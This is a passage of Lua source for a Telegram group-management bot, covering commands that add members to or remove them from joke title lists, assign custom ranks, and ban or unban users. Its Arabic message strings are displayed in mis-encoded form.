 ΨͺΩ Ψ±ΩΨΉ Ψ§ΩΨΉΨΆΩ Ψ²ΩΨ¬ΨͺΩβ―
Ψ§ΩΨ’Ω ΩΩΩΩΩΩ Ψ£Ψ?Ψ° Ψ±Ψ§Ψ­ΨͺΩΩ ΩΨ§ΨͺΩΨΆΩΩ Ψ§ΨΉΩΩΩ ΩΨ§Ψ­Ψ―
Ω­ 
]] 
send(msg.chat_id_, msg.id_, usertext..Text)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end

if (text == ("ΨͺΩΨ²ΩΩ Ψ²ΩΨ¬ΨͺΩ")) and msg.reply_to_message_id_ then
function start_function(extra, result, success)
database:srem(bot_id..'zoga:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n Ω­ Ψ§ΩΨΉΨΆΩ Β» ['..data.first_name_..'](t.me/'..(data.username_ or 'revorb0t')..')'
Text = [[
Ω΄ ΨͺΩ ΨͺΩΨ²ΩΩ Ψ§ΩΨΉΨΆΩ Ψ²ΩΨ¬ΨͺΩβ―
ΩΨ²ΩΨͺΩΨ§ ΨΉΨ΄Ψ§Ω ΩΨ΄ Ψ¨ΨͺΨΉΨ±Ω ΨͺΨΉΩΩ Ψ΅Ψ­ 
Ω­ 
]]
send(msg.chat_id_, msg.id_, usertext..Text)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end

-------

if text == 'ΩΨ³Ψ­ Ψ§ΩΩΨͺΩΨ­Ψ―Ψ§Ψͺ' then
database:del(bot_id..'wahidaa:User'..msg.chat_id_)
send(msg.chat_id_, msg.id_, ' Ω­ ΨͺΩ ΩΨ³Ψ­ Ψ¬ΩΩΨΉ Ψ§ΩΩΨͺΩΨ­Ψ―Ψ§Ψͺ')
end

if text == ("ΨͺΨ§Ψ¬ ΩΩΩΨͺΩΨ­Ψ―Ψ§Ψͺ") or text == ("ΨͺΨ§Ω ΩΩΩΨͺΩΨ­Ψ―Ψ§Ψͺ") then
local list = database:smembers(bot_id..'wahidaa:User'..msg.chat_id_)
t = "\n Ω­ ΩΨ§Ψ¦ΩΨ© ΩΨͺΩΨ­Ψ―Ψ§Ψͺ Ψ§ΩΨ¬Ψ±ΩΨ¨ \nΒ©βββββΒ©βββββΒ©\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."User:Name" .. v)
if username then
t = t..""..k.."Β» Ψ§ΩΩΨͺΩΨ­Ψ―Ω [@"..username.."]\n"
else
t = t..""..k.."Β» Ψ§ΩΩΨͺΩΨ­Ψ―Ω`"..v.."`\n"
end
end
if #list == 0 then
t = " Ω­ ΩΨ§ ΩΩΨ¬Ψ― ΩΨͺΩΨ­Ψ―Ψ§Ψͺ"
end
send(msg.chat_id_, msg.id_, t)
end

if text == ("Ψ±ΩΨΉ ΩΨͺΩΨ­Ψ―Ω") and tonumber(msg.reply_to_message_id_) ~= 0 then


function start_function(extra, result, success)
database:sadd(bot_id..'wahidaa:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n Ω­ Ψ§ΩΨΉΨΆΩ Β» ['..data.first_name_..'](t.me/'..(data.username_ or 'revorb0t')..')'
local Text = [[
 ΨͺΩ Ψ±ΩΨΉ Ψ§ΩΩΨͺΩΨ­Ψ―Ω Ψ¨ΩΨ¬Ψ§Ψ­β―
 ΨͺΩΨͺ Ψ₯ΨΆΨ§ΩΨͺΩΨ§ Ψ§ΩΩ ΩΨ§Ψ¦ΩΨ© Ψ§ΩΩΨͺΩΨ­Ψ―ΩΩ ΩΨ§ΩΩΨͺΨ?ΩΩΩΩ ΨΉΩΩΩΨ§Ω
Ω­ 
]] 
send(msg.chat_id_, msg.id_, usertext..Text)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end

if (text == ("ΨͺΩΨ²ΩΩ ΩΨͺΩΨ­Ψ―Ω")) and msg.reply_to_message_id_ then
function start_function(extra, result, success)
database:srem(bot_id..'wahidaa:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n Ω­ Ψ§ΩΨΉΨΆΩ Β» ['..data.first_name_..'](t.me/'..(data.username_ or 'revorb0t')..')'
Text = [[
 ΨͺΩ ΨͺΩΨ²ΩΩ Ψ§ΩΩΨͺΩΨ­Ψ―Ω Ψ¨ΩΨ¬Ψ§Ψ­β―
 ΨͺΩΨͺ ΨͺΩΨ²ΩΩΩΨ§ ΩΩ ΩΨ§Ψ¦ΩΨ© Ψ§ΩΩΨͺΩΨ­Ψ―ΩΩ 
Ω­ 
]]
send(msg.chat_id_, msg.id_, usertext..Text)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end

-------

if text == 'ΩΨ³Ψ­ Ψ§ΩΩΩ Ψ¨ΩΩΨ¨Ω' then
database:del(bot_id..' alby:User'..msg.chat_id_)
send(msg.chat_id_, msg.id_, ' Ω­ ΨͺΩ ΩΨ³Ψ­ Ψ¬ΩΩΨΉ Ψ§ΩΩΩ Ψ¨ΩΩΨ¨Ω')
end

if text == ("ΨͺΨ§Ψ¬ ΩΩΩ Ψ¨ΩΩΨ¨Ω") or text == ("ΨͺΨ§Ω ΩΩΩ Ψ¨ΩΩΨ¨Ω") then
local list = database:smembers(bot_id..' alby:User'..msg.chat_id_)
t = "\n Ω­ ΩΨ§Ψ¦ΩΨ© ΩΩΩΨ¨ Ψ§ΩΨ¬Ψ±ΩΨ¨ \nΒ©βββββΒ©βββββΒ©\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."User:Name" .. v)
if username then
t = t..""..k.."Β» Ψ§ΩΩΩΨ¨ [@"..username.."]\n"
else
t = t..""..k.."Β» Ψ§ΩΩΩΨ¨`"..v.."`\n"
end
end
if #list == 0 then
t = " Ω­ ΩΨ§ ΩΩΨ¬Ψ― Ψ­Ψ― Ψ¨ΩΩΨ¨Ω"
end
send(msg.chat_id_, msg.id_, t)
end

if text == ("Ψ±ΩΨΉ Ψ¨ΩΩΨ¨Ω") and tonumber(msg.reply_to_message_id_) ~= 0 then


function start_function(extra, result, success)
database:sadd(bot_id..' alby:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n Ω­ Ψ§ΩΨΉΨΆΩ Β» ['..data.first_name_..'](t.me/'..(data.username_ or 'revorb0t')..')'
local Text = [[
 ΨͺΩ Ψ±ΩΨΉ Ψ§ΩΨΉΨΆΩ Ψ―Ψ§Ψ?Ω ΩΩΨ¨Ωβ―
 ΨͺΩΨͺ ΨͺΨ±ΩΩΨͺΩ Ψ¨ΩΨ¬Ψ§Ψ­
Ω­ 
]] 
send(msg.chat_id_, msg.id_, usertext..Text)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end

if (text == ("ΨͺΩΨ²ΩΩ ΩΩ ΩΩΨ¨Ω")) and msg.reply_to_message_id_ then
function start_function(extra, result, success)
database:srem(bot_id..' alby:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n Ω­ Ψ§ΩΨΉΨΆΩ Β» ['..data.first_name_..'](t.me/'..(data.username_ or 'revorb0t')..')'
Text = [[
 ΨͺΩ ΨͺΩΨ²ΩΩ Ψ§ΩΨΉΨΆΩ ΩΩ ΩΩΨ¨Ωβ―
 ΩΩΨ§ Ψ§ΩΩΩ ΩΩΩ ΩΨ¬Ψ±Ψ­Ωπ’π
Ω­ 
]]
send(msg.chat_id_, msg.id_, usertext..Text)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end

--------

if text == 'ΩΨ³Ψ­ Ψ§ΩΩΨ·ΩΩΨ§Ψͺ' then
database:del(bot_id..'tlaa2:User'..msg.chat_id_)
send(msg.chat_id_, msg.id_, ' Ω­ ΨͺΩ ΩΨ³Ψ­ Ψ¬ΩΩΨΉ Ψ§ΩΩΨ·ΩΩΨ§Ψͺ')
end

if text == ("ΨͺΨ§Ψ¬ ΩΩΩΨ·ΩΩΨ§Ψͺ") or text == ("ΨͺΨ§Ω ΩΩΩΨ·ΩΩΨ§Ψͺ") then
local list = database:smembers(bot_id..'tlaa2:User'..msg.chat_id_)
t = "\n Ω­ ΩΨ§Ψ¦ΩΨ© ΩΨ·ΩΩΨ§Ψͺ Ψ§ΩΨ¬Ψ±ΩΨ¨ \nΒ©βββββΒ©βββββΒ©\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."User:Name" .. v)
if username then
t = t..""..k.."Β» Ψ§ΩΩΨ·ΩΩΩ [@"..username.."]\n"
else
t = t..""..k.."Β» Ψ§ΩΩΨ·ΩΩΩ`"..v.."`\n"
end
end
if #list == 0 then
t = " Ω­ ΩΨ§ ΩΩΨ¬Ψ― ΩΨ·ΩΩΨ§Ψͺ"
end
send(msg.chat_id_, msg.id_, t)
end

if text == ("Ψ±ΩΨΉ ΩΨ·ΩΩΩ") or text == ("Ψ·ΩΨ§Ω") and tonumber(msg.reply_to_message_id_) ~= 0 then


function start_function(extra, result, success)
database:sadd(bot_id..'tlaa2:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n Ω­ Ψ§ΩΨΉΨΆΩ Β» ['..data.first_name_..'](t.me/'..(data.username_ or 'revorb0t')..')'
local Text = [[
Ω­ ΨͺΩ Ψ±ΩΨΉ Ψ§ΩΨΉΨΆΩ Ψ§ΩΩ ΩΨ§Ψ¦ΩΩ Ψ§ΩΩΨ·ΩΩΨ§Ψͺ 
Ω­ Ψ§ΩΨ’Ω Ψ¨ΩΨͺ ΩΨ·ΩΩΩ Ψ?ΩΩΩΨ§ Ψ²Ω Ψ§ΩΩΩΨ¨Ω ΩΨ―Ψ§
]] 
send(msg.chat_id_, msg.id_, usertext..Text)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end

if (text == ("ΨͺΩΨ²ΩΩ ΩΨ·ΩΩΩ")) and msg.reply_to_message_id_ then
function start_function(extra, result, success)
database:srem(bot_id..'tlaa2:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n Ω­ Ψ§ΩΨΉΨΆΩ Β» ['..data.first_name_..'](t.me/'..(data.username_ or 'revorb0t')..')'
Text = [[
Ω­ ΨͺΩ ΨͺΩΨ²ΩΩΩΨ§ ΩΩ ΩΨ§Ψ¦ΩΩ Ψ§ΩΩΨ·ΩΩΨ§Ψͺ
Ω­ Ψ²ΩΨ¬ΩΨ§ Ψ±ΨΆΩ ΨΉΩΩΨ§ Ψ§ΩΨ­ΩΨ―ΩΩΩ
]]
send(msg.chat_id_, msg.id_, usertext..Text)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end
-----------
if text and text:match("Ψ±ΩΨΉ (.*)") and tonumber(msg.reply_to_message_id_) > 0 and Admin(msg) then 
local RTPA = text:match("Ψ±ΩΨΉ (.*)")
if database:sismember(bot_id.."Coomds"..msg.chat_id_,RTPA) then
function by_reply(extra, result, success) 
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
local Tshakert = database:get(bot_id.."Comd:New:rt:bot:"..RTPA..msg.chat_id_)
if Tshakert == "ΩΩΩΨ²" and Admin(msg) then
send(msg.chat_id_, msg.id_,"\nΩ­ Ψ§ΩΨΉΨΆΩ Β» ["..data.first_name_.."](t.me/"..(data.username_ or "revorb0t")..")".."\nΩ­ ΨͺΩ Ψ±ΩΨΉΩ "..RTPA.." ΩΩΨ§\n") 
database:set(bot_id.."Comd:New:rt:User:"..msg.chat_id_..result.sender_user_id_,RTPA) 
database:sadd(bot_id.."Special:User"..msg.chat_id_,result.sender_user_id_) 
elseif Tshakert == "Ψ§Ψ―ΩΩ" and Manger(msg) then 
send(msg.chat_id_, msg.id_,"\nΩ­ Ψ§ΩΨΉΨΆΩ Β» ["..data.first_name_.."](t.me/"..(data.username_ or "revorb0t")..")".."\nΩ­ ΨͺΩ Ψ±ΩΨΉΩ "..RTPA.." ΩΩΨ§\n") 
database:set(bot_id.."Comd:New:rt:User:"..msg.chat_id_..result.sender_user_id_,RTPA)
database:sadd(bot_id.."Mod:User"..msg.chat_id_,result.sender_user_id_) 
elseif Tshakert == "ΩΨ―ΩΨ±" and Creator(msg) then
send(msg.chat_id_, msg.id_,"\nΩ­ Ψ§ΩΨΉΨΆΩ Β» ["..data.first_name_.."](t.me/"..(data.username_ or "revorb0t")..")".."\nΩ­ ΨͺΩ Ψ±ΩΨΉΩ "..RTPA.." ΩΩΨ§\n") 
database:set(bot_id.."Comd:New:rt:User:"..msg.chat_id_..result.sender_user_id_,RTPA) 
database:sadd(bot_id.."Manager"..msg.chat_id_,result.sender_user_id_) 
elseif Tshakert == "ΨΉΨΆΩ" and Admin(msg) then
send(msg.chat_id_, msg.id_,"\nΩ­ Ψ§ΩΨΉΨΆΩ Β» ["..data.first_name_.."](t.me/"..(data.username_ or "revorb0t")..")".."\nΩ­ ΨͺΩ Ψ±ΩΨΉΩ "..RTPA.." ΩΩΨ§\n") 
end
end,nil) 
end 
tdcli_function ({ ID = "GetMessage", chat_id_ = msg.chat_id_, message_id_ = tonumber(msg.reply_to_message_id_) }, by_reply, nil)
end
end
if text and text:match("ΨͺΩΨ²ΩΩ (.*)") and tonumber(msg.reply_to_message_id_) > 0 and Admin(msg) then 
local RTPA = text:match("ΨͺΩΨ²ΩΩ (.*)")
if database:sismember(bot_id.."Coomds"..msg.chat_id_,RTPA) then
function by_reply(extra, result, success) 
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
local Tshakert = database:get(bot_id.."Comd:New:rt:bot:"..RTPA..msg.chat_id_)
if Tshakert == "ΩΩΩΨ²" and Admin(msg) then
send(msg.chat_id_, msg.id_,"\nΩ­ Ψ§ΩΨΉΨΆΩ Β» ["..data.first_name_.."](t.me/"..(data.username_ or "revorb0t")..")".."\nΩ­ ΨͺΩ ΨͺΩΨ²ΩΩΩ ΩΩ "..RTPA.." ΩΩΨ§\n") 
database:srem(bot_id.."Special:User"..msg.chat_id_,result.sender_user_id_) 
database:del(bot_id.."Comd:New:rt:User:"..msg.chat_id_..result.sender_user_id_)
elseif Tshakert == "Ψ§Ψ―ΩΩ" and Manger(msg) then 
send(msg.chat_id_, msg.id_,"\nΩ­ Ψ§ΩΨΉΨΆΩ Β» ["..data.first_name_.."](t.me/"..(data.username_ or "revorb0t")..")".."\nΩ­ ΨͺΩ ΨͺΩΨ²ΩΩΩ ΩΩ "..RTPA.." ΩΩΨ§\n") 
database:srem(bot_id.."Mod:User"..msg.chat_id_,result.sender_user_id_) 
database:del(bot_id.."Comd:New:rt:User:"..msg.chat_id_..result.sender_user_id_)
elseif Tshakert == "ΩΨ―ΩΨ±" and Creator(msg) then
send(msg.chat_id_, msg.id_,"\nΩ­ Ψ§ΩΨΉΨΆΩ Β» ["..data.first_name_.."](t.me/"..(data.username_ or "revorb0t")..")".."\nΩ­ ΨͺΩ ΨͺΩΨ²ΩΩΩ ΩΩ "..RTPA.." ΩΩΨ§\n") 
database:srem(bot_id.."Manager"..msg.chat_id_,result.sender_user_id_) 
database:del(bot_id.."Comd:New:rt:User:"..msg.chat_id_..result.sender_user_id_)
elseif Tshakert == "ΨΉΨΆΩ" and Admin(msg) then
send(msg.chat_id_, msg.id_,"\nΩ­ Ψ§ΩΨΉΨΆΩ Β» ["..data.first_name_.."](t.me/"..(data.username_ or "revorb0t")..")".."\nΩ­ ΨͺΩ ΨͺΩΨ²ΩΩΩ ΩΩ "..RTPA.." ΩΩΨ§\n") 
end
end,nil) 
end 
tdcli_function ({ ID = "GetMessage", chat_id_ = msg.chat_id_, message_id_ = tonumber(msg.reply_to_message_id_) }, by_reply, nil)
end
end
if text and text:match("^Ψ±ΩΨΉ (.*) @(.*)") and Admin(msg) then 
local text1 = {string.match(text, "^(Ψ±ΩΨΉ) (.*) @(.*)$")}
if database:sismember(bot_id.."Coomds"..msg.chat_id_,text1[2]) then
function py_username(extra, result, success) 
if result.id_ then
local Tshakert = database:get(bot_id.."Comd:New:rt:bot:"..text1[2]..msg.chat_id_)
if Tshakert == "ΩΩΩΨ²" and Admin(msg) then
send(msg.chat_id_, msg.id_,"\nΩ­ Ψ§ΩΨΉΨΆΩ Β» ["..result.title_.."](t.me/"..(text1[3] or "revorb0t")..")".."\nΩ­ ΨͺΩ Ψ±ΩΨΉΩ "..text1[2].." ΩΩΨ§") 
database:sadd(bot_id.."Special:User"..msg.chat_id_,result.id_) 
database:set(bot_id.."Comd:New:rt:User:"..msg.chat_id_..result.id_,text1[2])
elseif Tshakert == "Ψ§Ψ―ΩΩ" and Manger(msg) then 
send(msg.chat_id_, msg.id_,"\nΩ­ Ψ§ΩΨΉΨΆΩ Β» ["..result.title_.."](t.me/"..(text1[3] or "revorb0t")..")".."\nΩ­ ΨͺΩ Ψ±ΩΨΉΩ "..text1[2].." ΩΩΨ§") 
database:sadd(bot_id.."Mod:User"..msg.chat_id_,result.id_) 
database:set(bot_id.."Comd:New:rt:User:"..msg.chat_id_..result.id_,text1[2])
elseif Tshakert == "ΩΨ―ΩΨ±" and Creator(msg) then
send(msg.chat_id_, msg.id_,"\nΩ­ Ψ§ΩΨΉΨΆΩ Β» ["..result.title_.."](t.me/"..(text1[3] or "revorb0t")..")".."\nΩ­ ΨͺΩ Ψ±ΩΨΉΩ "..text1[2].." ΩΩΨ§") 
database:sadd(bot_id.."Manager"..msg.chat_id_,result.id_) 
database:set(bot_id.."Comd:New:rt:User:"..msg.chat_id_..result.id_,text1[2])
elseif Tshakert == "ΨΉΨΆΩ" and Admin(msg) then
send(msg.chat_id_, msg.id_,"\nΩ­ Ψ§ΩΨΉΨΆΩ Β» ["..result.title_.."](t.me/"..(text1[3] or "revorb0t")..")".."\nΩ­ ΨͺΩ Ψ±ΩΨΉΩ "..text1[2].." ΩΩΨ§") 
end
else
info = "Ω­ Ψ§ΩΩΨΉΨ±Ω ΨΊΩΨ·"
send(msg.chat_id_, msg.id_,info)
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = text1[3]},py_username,nil) 
end 
end
if text and text:match("^ΨͺΩΨ²ΩΩ (.*) @(.*)") and Admin(msg) then 
local text1 = {string.match(text, "^(ΨͺΩΨ²ΩΩ) (.*) @(.*)$")}
if database:sismember(bot_id.."Coomds"..msg.chat_id_,text1[2]) then
function py_username(extra, result, success) 
if result.id_ then
local Tshakert = database:get(bot_id.."Comd:New:rt:bot:"..text1[2]..msg.chat_id_)
if Tshakert == "ΩΩΩΨ²" and Admin(msg) then
send(msg.chat_id_, msg.id_,"\nΩ­ Ψ§ΩΨΉΨΆΩ Β» ["..result.title_.."](t.me/"..(text1[3] or "revorb0t")..")".."\nΩ­ ΨͺΩ ΨͺΩΨ±ΩΩΩ ΩΩ "..text1[2].." ΩΩΨ§") 
database:srem(bot_id.."Special:User"..msg.chat_id_,result.id_) 
database:del(bot_id.."Comd:New:rt:User:"..msg.chat_id_..result.id_)
elseif Tshakert == "Ψ§Ψ―ΩΩ" and Manger(msg) then 
send(msg.chat_id_, msg.id_,"\nΩ­ Ψ§ΩΨΉΨΆΩ Β» ["..result.title_.."](t.me/"..(text1[3] or "revorb0t")..")".."\nΩ­ ΨͺΩ ΨͺΩΨ±ΩΩΩ ΩΩ "..text1[2].." ΩΩΨ§") 
database:srem(bot_id.."Mod:User"..msg.chat_id_,result.id_) 
database:del(bot_id.."Comd:New:rt:User:"..msg.chat_id_..result.id_)
elseif Tshakert == "ΩΨ―ΩΨ±" and Creator(msg) then
send(msg.chat_id_, msg.id_,"\nΩ­ Ψ§ΩΨΉΨΆΩ Β» ["..result.title_.."](t.me/"..(text1[3] or "revorb0t")..")".."\nΩ­ ΨͺΩ ΨͺΩΨ±ΩΩΩ ΩΩ "..text1[2].." ΩΩΨ§") 
database:srem(bot_id.."Manager"..msg.chat_id_,result.id_) 
database:del(bot_id.."Comd:New:rt:User:"..msg.chat_id_..result.id_)
elseif Tshakert == "ΨΉΨΆΩ" and Admin(msg) then
send(msg.chat_id_, msg.id_,"\nΩ­ Ψ§ΩΨΉΨΆΩ Β» ["..result.title_.."](t.me/"..(text1[3] or "revorb0t")..")".."\nΩ­ ΨͺΩ ΨͺΩΨ±ΩΩΩ ΩΩ "..text1[2].." ΩΩΨ§") 
end
else
info = "Ω­ Ψ§ΩΩΨΉΨ±Ω ΨΊΩΨ·"
send(msg.chat_id_, msg.id_,info)
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = text1[3]},py_username,nil) 
end 
end

if text == ("Ψ­ΨΈΨ±") and msg.reply_to_message_id_ ~= 0 and Admin(msg) then
if not Creator(msg) and database:get(bot_id.."Ban:Cheking"..msg.chat_id_) then 
send(msg.chat_id_, msg.id_,'Ω­ ΩΩΨ― ΨͺΩ ΨͺΨΉΨ·ΩΩ Ψ§ΩΨ­ΨΈΨ± Ω Ψ§ΩΨ·Ψ±Ψ― ΩΩ ΩΨ¨Ω Ψ§ΩΩΩΨ΄Ψ¦ΩΩ')
return false
end
function Function_Tshake(extra, result, success)
if Rank_Checking(result.sender_user_id_, msg.chat_id_) == true then
send(msg.chat_id_, msg.id_, "\nΩ­ ΨΉΨ°Ψ±Ψ§ ΩΨ§ ΨͺΨ³ΨͺΨ·ΩΨΉ Ψ·Ψ±Ψ― Ψ§Ω Ψ­ΨΈΨ± Ψ§Ω ΩΨͺΩ Ψ§Ω ΨͺΩΩΩΨ― ( "..Get_Rank(result.sender_user_id_,msg.chat_id_).." )")
else
tdcli_function ({ ID = "ChangeChatMemberStatus", chat_id_ = msg.chat_id_, user_id_ = result.sender_user_id_, status_ = { ID = "ChatMemberStatusKicked" },},function(arg,data) 
if (data and data.code_ and data.code_ == 400 and data.message_ == "CHAT_ADMIN_REQUIRED") then 
send(msg.chat_id_, msg.id_,"Ω­ ΩΩΨ³ ΩΨ―Ω Ψ΅ΩΨ§Ψ­ΩΨ© Ψ­ΨΈΨ± Ψ§ΩΩΨ³ΨͺΨ?Ψ―ΩΩΩ ΩΨ±Ψ¬Ω ΨͺΩΨΉΩΩΩΨ§ !") 
return false 
end
if msg.can_be_deleted_ == false then 
send(msg.chat_id_, msg.id_,"Ω­ Ψ§ΩΨ¨ΩΨͺ ΩΩΨ³ Ψ§Ψ―ΩΩ ΩΨ±Ψ¬Ω ΨͺΨ±ΩΩΨͺΩ !") 
return false 
end
database:sadd(bot_id.."Ban:User"..msg.chat_id_, result.sender_user_id_)
Kick_Group(result.chat_id_, result.sender_user_id_)
Reply_Status(msg,result.sender_user_id_,"reply","Ω­ ΨͺΩ Ψ­ΨΈΨ±Ω ΩΩ Ψ§ΩΩΨ¬ΩΩΨΉΩ") 
end,nil) 
end
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, Function_Tshake, nil)
return false
end

if text and text:match("^Ψ­ΨΈΨ± @(.*)$") and Admin(msg) then
local username = text:match("^Ψ­ΨΈΨ± @(.*)$")
if not Creator(msg) and database:get(bot_id.."Ban:Cheking"..msg.chat_id_) then 
send(msg.chat_id_, msg.id_,'Ω­ ΩΩΨ― ΨͺΩ ΨͺΨΉΨ·ΩΩ Ψ§ΩΨ­ΨΈΨ± Ω Ψ§ΩΨ·Ψ±Ψ― ΩΩ ΩΨ¨Ω Ψ§ΩΩΩΨ΄Ψ¦ΩΩ')
return false
end
function Function_Tshake(extra, result, success)
if result.id_ then
if Rank_Checking(result.id_, msg.chat_id_) == true then
send(msg.chat_id_, msg.id_, "\nΩ­ ΨΉΨ°Ψ±Ψ§ ΩΨ§ ΨͺΨ³ΨͺΨ·ΩΨΉ Ψ·Ψ±Ψ― Ψ§Ω Ψ­ΨΈΨ± Ψ§Ω ΩΨͺΩ Ψ§Ω ΨͺΩΩΩΨ― ( "..Get_Rank(result.id_,msg.chat_id_).." )")
else
tdcli_function ({ ID = "ChangeChatMemberStatus", chat_id_ = msg.chat_id_, user_id_ = result.id_, status_ = { ID = "ChatMemberStatusKicked" },},function(arg,data) 
if (result and result.type_ and result.type_.ID == "ChannelChatInfo") then
send(msg.chat_id_,msg.id_,"Ω­ ΨΉΨ°Ψ±Ψ§ ΨΉΨ²ΩΨ²Ω Ψ§ΩΩΨ³ΨͺΨ?Ψ―Ω ΩΨ§Ψ°Ψ§ ΩΨΉΨ±Ω ΩΩΨ§Ψ© ΩΨ±Ψ¬Ω Ψ§Ψ³ΨͺΨ?Ψ―Ψ§Ω Ψ§ΩΨ§ΩΨ± Ψ¨Ψ΅ΩΨ±Ω Ψ΅Ψ­ΩΨ­Ω !") 
return false 
end 
if (data and data.code_ and data.code_ == 400 and data.message_ == "CHAT_ADMIN_REQUIRED") then 
send(msg.chat_id_, msg.id_,"Ω­ ΩΩΨ³ ΩΨ―Ω Ψ΅ΩΨ§Ψ­ΩΨ© Ψ­ΨΈΨ± Ψ§ΩΩΨ³ΨͺΨ?Ψ―ΩΩΩ ΩΨ±Ψ¬Ω ΨͺΩΨΉΩΩΩΨ§ !") 
return false 
end
if msg.can_be_deleted_ == false then 
send(msg.chat_id_, msg.id_,"Ω­ Ψ§ΩΨ¨ΩΨͺ ΩΩΨ³ Ψ§Ψ―ΩΩ ΩΨ±Ψ¬Ω ΨͺΨ±ΩΩΨͺΩ !") 
return false 
end
database:sadd(bot_id.."Ban:User"..msg.chat_id_, result.id_)
Kick_Group(msg.chat_id_, result.id_)
Reply_Status(msg,result.id_,"reply","Ω­ ΨͺΩ Ψ­ΨΈΨ±Ω ΩΩ Ψ§ΩΩΨ¬ΩΩΨΉΩ") 
end,nil) 
end
else
send(msg.chat_id_, msg.id_, "Ω­ ΩΨ§ ΩΩΨ¬Ψ― Ψ­Ψ³Ψ§Ψ¨ Ψ¨ΩΨ§Ψ°Ψ§ Ψ§ΩΩΨΉΨ±Ω")
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, Function_Tshake, nil)
return false
end

if text and text:match("^Ψ­ΨΈΨ± (%d+)$") and Admin(msg) then
local userid = text:match("^Ψ­ΨΈΨ± (%d+)$") 
if not Creator(msg) and database:get(bot_id.."Ban:Cheking"..msg.chat_id_) then 
send(msg.chat_id_, msg.id_,'Ω­ ΩΩΨ― ΨͺΩ ΨͺΨΉΨ·ΩΩ Ψ§ΩΨ­ΨΈΨ± Ω Ψ§ΩΨ·Ψ±Ψ― ΩΩ ΩΨ¨Ω Ψ§ΩΩΩΨ΄Ψ¦ΩΩ')
return false
end
if Rank_Checking(userid, msg.chat_id_) == true then
send(msg.chat_id_, msg.id_, "\nΩ­ ΨΉΨ°Ψ±Ψ§ ΩΨ§ ΨͺΨ³ΨͺΨ·ΩΨΉ Ψ·Ψ±Ψ― Ψ§Ω Ψ­ΨΈΨ± Ψ§Ω ΩΨͺΩ Ψ§Ω ΨͺΩΩΩΨ― ( "..Get_Rank(userid,msg.chat_id_).." )")
else
tdcli_function ({ ID = "ChangeChatMemberStatus", chat_id_ = msg.chat_id_, user_id_ = userid, status_ = { ID = "ChatMemberStatusKicked" },},function(arg,data) 
if (data and data.code_ and data.code_ == 400 and data.message_ == "CHAT_ADMIN_REQUIRED") then 
send(msg.chat_id_, msg.id_,"Ω­ ΩΩΨ³ ΩΨ―Ω Ψ΅ΩΨ§Ψ­ΩΨ© Ψ­ΨΈΨ± Ψ§ΩΩΨ³ΨͺΨ?Ψ―ΩΩΩ ΩΨ±Ψ¬Ω ΨͺΩΨΉΩΩΩΨ§ !") 
return false 
end
if msg.can_be_deleted_ == false then 
send(msg.chat_id_, msg.id_,"Ω­ Ψ§ΩΨ¨ΩΨͺ ΩΩΨ³ Ψ§Ψ―ΩΩ ΩΨ±Ψ¬Ω ΨͺΨ±ΩΩΨͺΩ !") 
return false 
end
database:sadd(bot_id.."Ban:User"..msg.chat_id_, userid)
Kick_Group(msg.chat_id_, userid) 
Reply_Status(msg,userid,"reply","Ω­ ΨͺΩ Ψ­ΨΈΨ±Ω ΩΩ Ψ§ΩΩΨ¬ΩΩΨΉΩ") 
end,nil) 
end
return false
end
if text == ("Ψ§ΩΨΊΨ§Ψ‘ Ψ­ΨΈΨ±") and tonumber(msg.reply_to_message_id_) ~= 0 and Admin(msg) then
function Function_Tshake(extra, result, success)
if tonumber(result.sender_user_id_) == tonumber(bot_id) then
send(msg.chat_id_, msg.id_, "Ω­ Ψ§ΩΨ§ ΩΨ³Ψͺ ΩΨ­ΨΈΩΨ±Ψ§ \n") 
return false 
end
database:srem(bot_id.."Ban:User"..msg.chat_id_, result.sender_user_id_)
